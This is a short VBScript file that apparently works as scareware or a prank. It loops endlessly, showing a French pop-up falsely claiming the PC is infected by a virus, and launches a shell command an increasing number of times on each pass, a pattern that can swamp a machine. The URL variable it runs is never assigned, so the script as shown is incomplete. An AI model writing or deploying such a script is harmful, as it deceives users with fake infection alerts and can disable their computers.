Dim sURL 
Dim objShell
Dim iNbFois

iNbFois = 1


Do While true
 a = msgbox("Attention votre pc a ete infecte par un VIRUS" ,16, "VIRUS DETECTE")
 For i2 = 1 to iNbFois
  set objShell = CreateObject("WScript.Shell")
  objShell.run(sURL)
     WScript.Sleep 100
 Next
 iNbFois = iNbFois + 1
Loop